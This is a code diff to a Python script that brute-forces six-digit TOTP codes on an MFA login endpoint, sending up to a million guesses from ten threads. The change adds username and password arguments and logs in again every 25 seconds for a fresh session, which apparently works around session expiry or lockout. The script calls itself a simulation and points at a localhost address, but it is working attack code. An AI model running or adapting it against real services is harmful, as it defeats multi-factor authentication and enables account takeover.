@@ -60,35 +60,34 @@ def set_auth(session, token, cookie, header_name):
             session.headers["AUTHORIZATION"] = f"Bearer {token}"
 
 
-def enumerate_codes(session, url, field_code, success, verbose, start=0, end=999999):
-    """
-    Multi-thread search accorss codes starting from 000000 to 999999
-    Uses a thread pool to concurrently test the values. If there is a successful response, the search stops.
-    Args:
-        session (requests.Session): session object
-        url (str): target url
-        field_code (str): key name expected by server for the code
-        success (bool): success flag
-        verbose (bool): if true, logs every individual attempt to console
-        start (int): start index, defaults to 0
-        end (int): end index, defaults to 999999
-    Returns:
-        tuple containing:
-            str or None: succesful code if found, otherwise nothing
-            stats: execution metrics
-    """
-    attemot_counter = [0]
-    lock = Lock()
-    start_time = time.time()
+def get_fresh_session(base_url, username, password):
+    s = make_session()
+    s.verify = False
+    s.post(f"{base_url}/auth/mfa-login", data={"username": username, "password": password}, allow_redirects=True)
+    return s
+
+def enumerate_codes(base_url, username, password, url, field_code, success, verbose, start=0, end=999999):
     found = [None]
+    attempt_count = [0]
+    lock = Lock()
+    session_holder = [get_fresh_session(base_url, username, password)]
+    last_refresh = [time.time()]
 
     def try_single(code_int):
         if found[0]:
             return None
-        code = f"{code_int:06d}"
-        result = _try_code(session, url, code, field_code, success, verbose)
+
+        # refresh session every 25 seconds
         with lock:
-            attemot_counter[0] += 1
+            if time.time() - last_refresh[0] > 25:
+                session_holder[0] = get_fresh_session(base_url, username, password)
+                last_refresh[0] = time.time()
+                print("\n[*] Session refreshed")
+
+        code = f"{code_int:06d}"
+        result = _try_code(session_holder[0], url, code, field_code, success, verbose)
+        with lock:
+            attempt_count[0] += 1
         if result == "success":
             found[0] = code
             print(f"\n[!!!] TOTP accepted: {code}")
@@ -96,25 +95,26 @@ def enumerate_codes(session, url, field_code, success, verbose, start=0, end=999
             time.sleep(30)
         return result
 
+    start_time = time.time()
+
     with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = {executor.submit(try_single, i): i for i in range(start, end+1)}
+        futures = {executor.submit(try_single, i): i for i in range(start, end + 1)}
         for future in as_completed(futures):
             if found[0]:
                 executor.shutdown(wait=False, cancel_futures=True)
                 break
-        elapsed = time.time() - start_time
-        stats ={
-            "attempts": attemot_counter[0],
-            "time_in_seconds": round(elapsed, 2),
-            "time": f"{int(elapsed//60)} minutes {int(elapsed%60)} seconds",
-            "codes_in_a_second": round(attemot_counter[0] / elapsed, 2) if elapsed > 0 else 0,
-            "percentage_searched": round((attemot_counter[0] / (end - start + 1)) * 100, 4)
-        }
-        print(f"\n[*] Attempts: {stats['attempts']} | Time: {stats['time_in_seconds']} | Speed: {stats['codes_in_a_second']} req/s")
 
+    elapsed = time.time() - start_time
+    stats = {
+        "attempts_made": attempt_count[0],
+        "time_seconds": round(elapsed, 2),
+        "time_human": f"{int(elapsed // 60)}m {int(elapsed % 60)}s",
+        "codes_per_second": round(attempt_count[0] / elapsed, 2) if elapsed > 0 else 0,
+        "percentage_searched": round((attempt_count[0] / (end - start + 1)) * 100, 4)
+    }
+    print(f"\n[*] Attempts: {stats['attempts_made']} | Time: {stats['time_human']} | Speed: {stats['codes_per_second']} req/s")
 
     return found[0], stats
-
 
 def _try_code(session, url, code, field_code, success, verbose):
     """
@@ -167,6 +167,8 @@ def save_report(data, path="totp_results.json"):
 def main():
     parser = argparse.ArgumentParser(description="TOTP brute-force simulation")
     parser.add_argument("--url",          required=True)
+    parser.add_argument("--username", required=True)
+    parser.add_argument("--password", required=True)
     parser.add_argument("--mode",         required=True, choices=["enumerate"])
     parser.add_argument("--session-token", default=None)
     parser.add_argument("--cookie-name",  default=None)
@@ -186,8 +188,13 @@ def main():
     result_data = {"mode": args.mode, "url": args.url, "findings": []}
 
     if args.mode == "enumerate":
-        code, stats = enumerate_codes(s, args.url, args.field_code, args.success,
-                                args.verbose, args.start, args.end)
+        code, stats = enumerate_codes(
+            "https://127.0.0.1:5001",
+            args.username, args.password,
+            args.url, args.field_code, args.success,
+            args.verbose, args.start, args.end
+        )
+
         result_data["stats"] = stats
         if code:
             result_data["findings"].append({"type": "enumeration_success", "code": code})
